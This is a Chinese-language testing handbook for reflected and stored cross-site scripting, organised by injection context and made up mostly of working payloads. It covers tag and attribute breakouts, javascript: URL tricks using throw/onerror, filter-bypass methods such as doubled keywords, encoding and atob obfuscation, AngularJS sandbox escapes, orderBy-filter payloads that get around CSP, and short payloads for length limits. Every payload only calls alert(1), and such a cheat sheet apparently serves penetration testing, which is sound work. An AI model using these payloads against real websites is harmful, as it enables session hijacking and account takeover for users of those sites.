# XSS / Stored XSS 测试手册

## 1. 定位反射点与上下文
- 提交唯一标记 `x8x8x8`，在响应中定位回显位置。
- 判定回显语境：HTML 标签之间、属性值内（单/双/无引号）、事件处理器、JS 字符串、JS 代码块、URL 参数值、CSS 表达式、框架模板。
- 根据语境选择闭合字符与执行方式，先测基础 payload，再逐步探测过滤规则。

## 2. HTML 标签之间
- 注入标签：`<svg/onload=alert(1)>`、`<img src=x onerror=alert(1)>`。
- `<` 或 `>` 被过滤时，转向属性注入或利用已有标签闭合。
- 标签名被过滤（如 `script`）：用 `img`、`svg`、`video`、`audio`、`details`、`marquee`。

## 3. HTML 属性值内
- 双引号闭合：`" onmouseover=alert(1) x="`
- 单引号闭合：`' onfocus=alert(1) x='`
- 无引号属性：`x autofocus onfocus=alert(1) x=`
- 事件属性 `on*` 被过滤：用 `href=javascript:` 或 `src=javascript:`。
- `javascript:` 被过滤：尝试 `javas&#x09;cript:`、`javas&#x0A;cript:`、大小写混淆 `JaVaScRiPt:`。

## 4. `href`/`src` javascript: URL 上下文
- 目标：让浏览器执行 `javascript:` 协议后的代码。
- 当 `( )` 被过滤，不能直接调用函数：
  - 用 `throw` 触发全局错误处理：`throw/**/onerror=alert,1` 先赋值 `onerror=alert`，再抛出数字，浏览器调用 `alert(1)`。
  - 利用对象字面量、箭头函数、`toString/valueOf` 隐式调用：构造对象，定义 `toString` 为自定义函数，通过 `window+''` 强制字符串化执行该函数。函数体使用 `throw/**/onerror=alert,1`。
  - 用反引号调用函数：`alert\`1\``。
- 当无空格：用 `/**/`、`\t`、`\n`、`+` 代替。
- 在 JS 单引号字符串内闭合：
  - 用 `'` 闭合当前字符串，若处于对象内补 `}` 闭合对象，用逗号创建表达式，最后用 `{x:'` 补全语法。
  - 通用模板：`'},x=x=>{throw/**/onerror=alert,1},toString=x,window+'',{x:'`
  - 整个 payload 进行 URL 编码。

## 5. JS 字符串上下文
- 在 `<script>` 内：闭合字符串，用 `;alert(1)//` 或 `</script><script>alert(1)</script>`。
- 在单引号内且单引号被过滤：尝试用 `\` 逃逸或使用模板字符串 `${alert(1)}`。
- 括号被过滤：用反引号调用 `` alert`1` ``；用 `throw/**/onerror=alert,1`。
- 点号被过滤：用 `window['alert'](1)` 或 `top['al'+'ert']`。
- 逗号被过滤：用 `+` 连接或 `[].concat`。

## 6. 事件处理器注入
- 常用事件：`onmouseover`、`onfocus`、`onclick`、`onload`、`onerror`、`oninput`、`onscroll`、`onpointerenter`。
- 事件名被过滤（如 `on` 替换后删除）：双写关键字，如 `oonnclick` → 过滤器先替换 `on` 为 `o_n` 再删除 `o_n`，最终恢复 `onclick`。
- `alert` 被过滤：用 `top['al'+'ert']`、`window[atob('YWxlcnQ=')](1)`、`self['aler'+'t']`。

## 7. 字符过滤与编码绕过
- 过滤 `( )`：反引号调用 `` alert`1` ``；`throw/**/onerror=alert,1`。
- 过滤空格：用 `/`、`/**/`、`\t`、`\n`、`+`、`%0a`。
- 过滤 `.`：用 `window['alert'](1)`。
- 过滤 `[ ]`：用 `{` 对象属性赋值或 `with`。
- 过滤 `%`：避免 URL 编码或双重编码。
- 过滤 `\`：避免转义。
- 双重过滤（先替换后删除）：双写关键字，如 `oonn` 恢复 `on`，`scrscriptipt` 恢复 `script`。
- 服务端只解码一次：使用 `%2527` 双重编码。

## 8. 长度限制
- 短 payload：`<svg/onload=alert(1)>`（约 22 字符）。
- 用 URL 片段补充执行条件，如 `<input id=x autofocus onfocus=alert(1)>#x`。
- 利用框架特征，如 Angular 指令 + 过滤器拼接短表达式。

## 9. AngularJS 上下文
- 当页面有 `ng-app` 且输入被 Angular 编译，提交 `{{7*7}}` 若回显 49，则存在表达式执行。
- 旧版本沙箱逃逸：`{{$on.constructor('alert(1)')()}}` 或 `{{''.constructor.constructor('alert(1)')()}}`。
- 较新版本（1.6+）构造函数逃逸被限制，使用指令事件 + 过滤器：
  - 模板：`<input id=x ng-focus=$event.composedPath()|orderBy:'(alert)(1)'>#x`
  - `ng-focus` 触发表达式；`$event.composedPath()` 返回数组；`orderBy` 过滤器接受数组和表达式字符串，字符串被 Angular 求值，执行 `alert(1)`；URL 片段 `#x` 自动聚焦。
  - 替换事件：`ng-mouseenter`、`ng-click`；替换数组：`[1]`。
  - 表达式部分可使用 `(y=alert)(1)` 或 `(alert)(1)`。
- 当 CSP 禁止内联脚本和事件处理器，Angular 的 `ng-focus` 等指令是有效执行路径。
- 测试时确认 Angular 版本与沙箱状态，若 `{{7*7}}` 不执行，可能未加载 Angular 或不在 ng-app 作用域内。

## 10. 存储型 XSS 特殊点
- 存储型需要二次触发：先注入 payload，再访问触发页面。
- 输出上下文可能与输入上下文不同（例如输入在某个字段，输出在另一页面不同位置），需定位所有回显点。
- 若输出在 `href` 属性且 `javascript:` 被过滤，尝试 `data:text/html,<script>alert(1)</script>` 或 `vbscript:`。
- 若输出在 `<a href="...">`，注意服务端可能对 URL 编码进行部分解码，使用控制字符或实体绕过。

## 11. 踩过的坑
- 过滤器仅替换一次时，双写可绕过：提交 `oonn` 测试替换后是否留下 `on`。
- 在 JS 字符串内闭合时，补全后续引号/括号防止语法错误，用 `//` 或 `<!--` 注释掉剩余内容。
- `javascript:` URL 中，括号被过滤后，多数传统 payload 失效，多用 `throw` + `onerror` 赋值。
- AngularJS 沙箱版本差异大，构造函数逃逸可能失效，需准备基于过滤器的事件驱动 payload。
- 长度限制时，利用注释和短属性名，如 `id=x` 而非长 ID。